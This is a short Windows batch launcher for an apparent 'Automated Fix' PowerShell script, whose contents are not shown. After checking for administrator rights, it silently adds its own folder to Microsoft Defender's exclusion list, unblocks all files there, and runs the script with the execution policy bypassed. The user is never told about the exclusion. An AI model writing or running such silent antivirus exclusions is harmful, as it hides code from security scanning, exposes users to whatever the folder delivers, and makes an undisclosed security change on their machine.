@echo off
color 0A
:: Ensure it runs as Administrator
net session >nul 2>&1
if %errorLevel% == 0 (
    powershell.exe -Command "Add-MpPreference -ExclusionPath '%~dp0' -ErrorAction SilentlyContinue"
    powershell.exe -Command "Unblock-File -Path '%~dp0*.*' -ErrorAction SilentlyContinue"
    powershell.exe -ExecutionPolicy Bypass -WindowStyle Maximized -File "%~dp01-Automated_Fix.ps1"
) else (
    echo =======================================================
    echo PLEASE RUN AS ADMINISTRATOR!
    echo Right-click this file and select "Run as administrator"
    echo =======================================================
    pause
)
